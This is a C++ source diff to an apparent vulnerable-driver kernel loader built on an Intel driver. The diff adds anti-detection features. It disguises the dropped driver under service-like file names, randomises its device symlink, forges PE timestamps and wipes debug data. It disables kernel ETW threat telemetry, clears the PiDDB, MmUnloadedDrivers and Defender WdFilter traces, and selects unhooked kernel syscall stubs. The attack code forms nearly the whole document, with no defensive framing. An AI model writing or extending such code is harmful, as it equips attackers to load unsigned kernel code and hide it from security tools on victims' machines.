@@ -4,6 +4,7 @@
 #include <fstream>
 #include <vector>
 #include <filesystem>
+#include <algorithm>
 
 #include "utils.hpp"
 #include "service.hpp"
@@ -23,14 +24,21 @@ ULONG32 intel_driver::ntoskrnlImageSize = 0;
 bool intel_driver::runtimeReady = false;
 ULONG32 intel_driver::loadedDriverTimestamp = 0;
 std::wstring intel_driver::vulnerableDriverPath = L"";
+std::wstring intel_driver::loadedSymlinkName = L"";
+std::vector<uint8_t> intel_driver::cachedNtoskrnlText;
+uint64_t intel_driver::cachedNtoskrnlTextBase = 0;
+uint32_t intel_driver::cachedNtoskrnlTextSize = 0;
+bool intel_driver::g_stubPoolReady = false;
+std::vector<intel_driver::StubEntry> intel_driver::g_stubPool;
 
 static uint64_t kernel_MmGetPhysicalAddress = 0;
 static std::wstring cachedDriverName = L"";
 static std::wstring cachedDriverPath = L"";
+static std::wstring cachedDriverDir = L"";
 
 std::wstring intel_driver::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
-		cachedDriverName = kdmUtils::GenerateCryptoRandomName(8, 14);
+		cachedDriverName = kdmUtils::GenerateServiceLikeName();
 	}
 	return cachedDriverName;
 }
@@ -39,19 +47,45 @@ std::wstring intel_driver::GetDriverPath() {
 	if (!cachedDriverPath.empty())
 		return cachedDriverPath;
 
-	std::wstring temp = kdmUtils::GetFullTempPath();
-	if (temp.empty())
+	std::wstring base = kdmUtils::GetSystemDataPath();
+	if (base.empty())
+		base = kdmUtils::GetFullTempPath();
+	if (base.empty())
 		return L"";
 
-	std::wstring subdir = temp + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
+	std::wstring subdir = base + L"\\" + kdmUtils::GenerateCryptoRandomName(6, 10);
 	CreateDirectoryW(subdir.c_str(), NULL);
 
-	cachedDriverPath = subdir + L"\\" + GetDriverNameW() + L".sys";
+	static const wchar_t* innocuous_prefixes[] = {
+		L"audiosrv_", L"netsvc_", L"wmi_cache_", L"usbhub_", L"dxgi_", L"telemetry_", L"spool_"
+	};
+	const wchar_t* pfx = innocuous_prefixes[kdmUtils::CryptoRand32() % (sizeof(innocuous_prefixes) / sizeof(innocuous_prefixes[0]))];
+
+	cachedDriverDir = subdir;
+	cachedDriverPath = subdir + L"\\" + pfx + GetDriverNameW() + L".sys";
 	return cachedDriverPath;
 }
 
+std::wstring intel_driver::GetSymlinkName() {
+	return loadedSymlinkName;
+}
+
+HANDLE intel_driver::OpenDeviceHandle() {
+	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
+	return CreateFileW(devPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+}
+
+void intel_driver::CloseDeviceHandle() {
+	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
+		CloseHandle(hDevice);
+		hDevice = 0;
+	}
+}
+
 bool intel_driver::IsRunning() {
-	auto devPath = ENCW(L"\\\\.\\__WDT__");
+	if (loadedSymlinkName.empty())
+		return false;
+	std::wstring devPath = L"\\\\.\\" + loadedSymlinkName;
 	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
@@ -59,6 +93,52 @@ bool intel_driver::IsRunning() {
 		return true;
 	}
 	return false;
+}
+
+bool intel_driver::PopulateStubPool() {
+	if (g_stubPoolReady)
+		return !g_stubPool.empty();
+
+	std::string candidates[] = {
+		ENC("NtTraceControl"),
+		ENC("NtQueryDebugFilterState"),
+		ENC("NtSetDebugFilterState"),
+		ENC("NtFlushBuffersFileEx"),
+		ENC("NtAccessCheckByTypeAndAuditAlarm"),
+		ENC("NtAddAtom"),
+		ENC("NtGetCurrentProcessorNumber"),
+		ENC("NtQueryEvent"),
+		ENC("NtFlushVirtualMemory"),
+		ENC("NtEnumerateKey"),
+		ENC("NtQueryDirectoryObject"),
+		ENC("NtPrivilegeCheck"),
+	};
+
+	for (size_t i = 0; i < _countof(candidates); i++) {
+		uint64_t addr = GetKernelModuleExport(ntoskrnlAddr, candidates[i]);
+		if (!addr)
+			continue;
+		uint8_t probe[16] = { 0 };
+		if (!ReadMemory(addr, probe, sizeof(probe)))
+			continue;
+		if (probe[0] == 0x48 && probe[1] == 0xb8 && probe[10] == 0xff && probe[11] == 0xe0)
+			continue;
+		if (probe[0] == 0xe9 || probe[0] == 0xeb)
+			continue;
+		g_stubPool.push_back({ addr, candidates[i] });
+	}
+
+	g_stubPoolReady = true;
+	return !g_stubPool.empty();
+}
+
+bool intel_driver::PickStub(uint64_t& out_kaddr, std::string& out_name) {
+	if (g_stubPool.empty())
+		return false;
+	size_t idx = kdmUtils::CryptoRand32() % g_stubPool.size();
+	out_kaddr = g_stubPool[idx].kaddr;
+	out_name = g_stubPool[idx].name;
+	return true;
 }
 
 NTSTATUS intel_driver::AcquireDebugPrivilege() {
@@ -157,40 +237,119 @@ static bool DisableKernelEtwTi() {
 	return true;
 }
 
-static ULONG32 PatchDriverTimestamp(const std::wstring& driver_path) {
-	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-	if (hFile == INVALID_HANDLE_VALUE)
+static size_t PatchSymlinkInBuffer(BYTE* buf, size_t size, const std::wstring& newName) {
+	static const wchar_t needleW[] = L"__WDT__";
+	const size_t needleBytes = (sizeof(needleW) - sizeof(wchar_t));
+	const BYTE* needle = reinterpret_cast<const BYTE*>(needleW);
+
+	size_t newNameWChars = newName.size();
+	if (newNameWChars * sizeof(wchar_t) != needleBytes)
 		return 0;
 
+	size_t hits = 0;
+	for (size_t i = 0; i + needleBytes <= size; i++) {
+		if (memcmp(buf + i, needle, needleBytes) == 0) {
+			memcpy(buf + i, newName.data(), needleBytes);
+			hits++;
+		}
+	}
+	return hits;
+}
+
+static bool PatchDriverFile(const std::wstring& driver_path, ULONG32* out_timestamp, std::wstring* out_symlink) {
+	HANDLE hFile = CreateFileW(driver_path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	if (hFile == INVALID_HANDLE_VALUE)
+		return false;
+
 	DWORD fileSize = GetFileSize(hFile, nullptr);
+	if (!fileSize || fileSize > 32 * 1024 * 1024) {
+		CloseHandle(hFile);
+		return false;
+	}
+
 	auto buffer = std::make_unique<BYTE[]>(fileSize);
 	DWORD bytesRead = 0;
-	ReadFile(hFile, buffer.get(), fileSize, &bytesRead, nullptr);
+	if (!ReadFile(hFile, buffer.get(), fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
+		CloseHandle(hFile);
+		return false;
+	}
 
 	auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.get());
 	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
 		CloseHandle(hFile);
-		return 0;
+		return false;
 	}
 
 	auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(buffer.get() + dosHeader->e_lfanew);
 	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
 		CloseHandle(hFile);
-		return 0;
+		return false;
 	}
 
-	ULONG32 newTimestamp = kdmUtils::CryptoRand32();
+	ULONG32 realisticLow  = 0x55000000u;
+	ULONG32 realisticHigh = 0x68c00000u;
+	ULONG32 range = realisticHigh - realisticLow;
+	ULONG32 newTimestamp = realisticLow + (kdmUtils::CryptoRand32() % range);
 	ntHeaders->FileHeader.TimeDateStamp = newTimestamp;
 
-	ntHeaders->OptionalHeader.MajorOperatingSystemVersion = 10;
-	ntHeaders->OptionalHeader.MinorOperatingSystemVersion = 0;
+	ntHeaders->OptionalHeader.CheckSum = 0;
+
+	std::wstring newSymlink = kdmUtils::GenerateCryptoRandomName(7, 7);
+	size_t hits = PatchSymlinkInBuffer(buffer.get(), fileSize, newSymlink);
+
+	auto hiddenSection = [&](const char* name) -> PIMAGE_SECTION_HEADER {
+		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
+		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+			if (memcmp(sections[i].Name, name, strlen(name)) == 0)
+				return &sections[i];
+		}
+		return nullptr;
+	};
+
+	PIMAGE_SECTION_HEADER reloc_sec = hiddenSection(".reloc");
+	if (reloc_sec && reloc_sec->SizeOfRawData > 32) {
+		DWORD off = reloc_sec->PointerToRawData + reloc_sec->SizeOfRawData - 16;
+		if (off + 16 <= fileSize)
+			kdmUtils::CryptoFill(buffer.get() + off, 16);
+	}
+
+	PIMAGE_SECTION_HEADER rsrc_sec = hiddenSection(".rsrc");
+	if (rsrc_sec && rsrc_sec->SizeOfRawData > 64) {
+		DWORD off = rsrc_sec->PointerToRawData + rsrc_sec->SizeOfRawData - 32;
+		if (off + 32 <= fileSize)
+			kdmUtils::CryptoFill(buffer.get() + off, 32);
+	}
+
+	auto& debugDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
+	if (debugDir.VirtualAddress && debugDir.Size) {
+		DWORD dbg_off = 0;
+		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
+		for (DWORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+			if (debugDir.VirtualAddress >= sections[i].VirtualAddress &&
+				debugDir.VirtualAddress < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
+				dbg_off = sections[i].PointerToRawData + (debugDir.VirtualAddress - sections[i].VirtualAddress);
+				break;
+			}
+		}
+		if (dbg_off && dbg_off + debugDir.Size <= fileSize) {
+			kdmUtils::CryptoFill(buffer.get() + dbg_off, debugDir.Size);
+		}
+	}
 
 	SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
 	DWORD bytesWritten = 0;
 	WriteFile(hFile, buffer.get(), fileSize, &bytesWritten, nullptr);
+	FlushFileBuffers(hFile);
 	CloseHandle(hFile);
 
-	return newTimestamp;
+	if (out_timestamp)
+		*out_timestamp = newTimestamp;
+	if (out_symlink && hits > 0)
+		*out_symlink = newSymlink;
+	else if (out_symlink)
+		*out_symlink = L"";
+
+	return true;
 }
 
 static void SecureDeleteFile(const std::wstring& path) {
@@ -435,6 +594,9 @@ bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_
 }
 
 NTSTATUS intel_driver::Load() {
+	if (kdmUtils::IsHvciWithBlocklistActive())
+		return STATUS_ACCESS_DENIED;
+
 	if (intel_driver::IsRunning())
 		return STATUS_ALREADY_REGISTERED;
 
@@ -458,12 +620,15 @@ NTSTATUS intel_driver::Load() {
 		return STATUS_DISK_OPERATION_FAILED;
 	}
 
-	loadedDriverTimestamp = PatchDriverTimestamp(driver_path);
-	if (!loadedDriverTimestamp) {
+	ULONG32 ts = 0;
+	std::wstring newSymlink;
+	if (!PatchDriverFile(driver_path, &ts, &newSymlink) || !ts) {
 		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return STATUS_UNSUCCESSFUL;
 	}
+	loadedDriverTimestamp = ts;
+	loadedSymlinkName = newSymlink.empty() ? std::wstring(L"__WDT__") : newSymlink;
 
 	auto status = AcquireDebugPrivilege();
 	if (!NT_SUCCESS(status)) {
@@ -479,30 +644,31 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	auto devOpen = ENCW(L"\\\\.\\__WDT__");
-	hDevice = CreateFileW(devOpen.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	RestoreUsermodeEtw();
+	hDevice = OpenDeviceHandle();
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
+		RestoreUsermodeEtw();
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
 	if (ntoskrnlAddr == 0) {
+		RestoreUsermodeEtw();
 		intel_driver::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
 	}
 
 	if (!ScanForNtoskrnlPhysBase()) {
+		RestoreUsermodeEtw();
 		intel_driver::Unload();
 		return STATUS_NOT_FOUND;
 	}
 
 	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
 	if (!kernel_MmGetPhysicalAddress) {
+		RestoreUsermodeEtw();
 		intel_driver::Unload();
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
@@ -511,11 +677,16 @@ NTSTATUS intel_driver::Load() {
 
 	IMAGE_DOS_HEADER dosHeader = { 0 };
 	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+		RestoreUsermodeEtw();
 		intel_driver::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
 
+	PopulateStubPool();
+
 	DisableKernelEtwTi();
+
+	RestoreUsermodeEtw();
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
 		intel_driver::Unload();
@@ -532,10 +703,7 @@ NTSTATUS intel_driver::Load() {
 		return STATUS_DELETE_PENDING | 0x3000;
 	}
 
-	if (!intel_driver::ClearWdFilterDriverList()) {
-		intel_driver::Unload();
-		return STATUS_DELETE_PENDING | 0x4000;
-	}
+	intel_driver::ClearWdFilterDriverList();
 
 	return STATUS_SUCCESS;
 }
@@ -633,6 +801,12 @@ NTSTATUS intel_driver::Unload() {
 	ntoskrnlPhysBase = 0;
 	ntoskrnlImageSize = 0;
 
+	g_stubPool.clear();
+	g_stubPoolReady = false;
+	cachedNtoskrnlText.clear();
+	cachedNtoskrnlTextBase = 0;
+	cachedNtoskrnlTextSize = 0;
+
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
 		CloseHandle(hDevice);
 	hDevice = 0;
@@ -642,6 +816,8 @@ NTSTATUS intel_driver::Unload() {
 	std::wstring driver_path = GetDriverPath();
 	if (!driver_path.empty())
 		SecureDeleteFile(driver_path);
+
+	loadedSymlinkName.clear();
 
 	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
 }
@@ -759,7 +935,14 @@ bool intel_driver::ClearMmUnloadedDrivers() {
 	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0)
 		return false;
 
+	if (us_driver_base_dll_name.Buffer && us_driver_base_dll_name.MaximumLength) {
+		auto zeroBuf = std::make_unique<uint8_t[]>(us_driver_base_dll_name.MaximumLength);
+		WriteMemory((uintptr_t)us_driver_base_dll_name.Buffer, zeroBuf.get(), us_driver_base_dll_name.MaximumLength);
+	}
+
 	us_driver_base_dll_name.Length = 0;
+	us_driver_base_dll_name.MaximumLength = 0;
+	us_driver_base_dll_name.Buffer = nullptr;
 
 	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
 		return false;
